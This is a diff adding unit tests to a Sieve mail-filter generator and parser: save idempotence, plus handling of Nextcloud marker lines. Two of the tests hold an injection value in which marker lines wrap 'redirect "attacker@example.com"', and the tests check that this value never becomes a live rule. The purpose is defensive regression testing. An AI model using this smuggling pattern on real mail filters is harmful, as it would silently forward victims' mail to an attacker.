@@ -287,6 +287,24 @@ describe('external rule preservation (issue #201)', () => {
       expect(externalAfter[0].name).toBe('Untouchable');
       expect(externalAfter[0].conditions[0]).toMatchObject({ field: 'header', headerName: 'X-Spam' });
     });
+
+    it('writes the same script on every save, with no blank lines piling up around external rules', () => {
+      const initial = `${generateScript([makeBulwarkRule({ name: 'Mine' })])}\n\n# rule:[First]\nif header :is "X-Spam" "yes" {\n    discard;\n}\n\n\n# rule:[Second]\nif header :contains "Subject" "invoice" {\n    fileinto "Finance";\n}\n\n`;
+      const save = (script: string) => {
+        const parsed = parseScript(script);
+        return generateScript(parsed.rules, parsed.vacation, { externalRequires: parsed.externalRequires });
+      };
+
+      const first = save(initial);
+      const second = save(first);
+      const third = save(second);
+
+      expect(second).toBe(first);
+      expect(third).toBe(first);
+      expect(first).not.toMatch(/\n\n\n/);
+      expect(first).toContain('# --- External rules (managed outside Bulwark) ---\n# rule:[First]');
+      expect(first).toContain('}\n\n# rule:[Second]');
+    });
   });
 
   describe('Nextcloud Mail marker regions', () => {
@@ -376,6 +394,34 @@ describe('external rule preservation (issue #201)', () => {
 
       const headerCount = (script.match(/# --- External rules \(managed outside Bulwark\) ---/g) || []).length;
       expect(headerCount).toBe(1);
+    });
+
+    it('ignores marker lines inside a rule value, so the value never turns into live Sieve', () => {
+      const value = `x\n${NEXTCLOUD_MARKER}\nredirect "attacker@example.com";\n${NEXTCLOUD_MARKER}\ny`;
+      const bulwark = makeBulwarkRule({ conditions: [{ field: 'subject', comparator: 'contains', value }] });
+
+      const parsed = parseScript(generateScript([bulwark]));
+      expect(parsed.rules.filter(r => r.originLabel === 'Nextcloud')).toHaveLength(0);
+      expect(parsed.rules).toHaveLength(1);
+      expect(parsed.rules[0].conditions[0].value).toBe(value);
+    });
+
+    it('ignores marker lines inside a text: block', () => {
+      const script = [
+        'require ["vacation", "fileinto"];',
+        'if header :contains "Subject" "invoice" {',
+        '    fileinto "Finance";',
+        '}',
+        'vacation :subject "Away" text:',
+        NEXTCLOUD_MARKER,
+        'redirect "attacker@example.com";',
+        NEXTCLOUD_MARKER,
+        '.',
+        ';',
+        '',
+      ].join('\n');
+      const result = parseScript(script);
+      expect(result.rules.filter(r => r.originLabel === 'Nextcloud')).toHaveLength(0);
     });
   });
 });
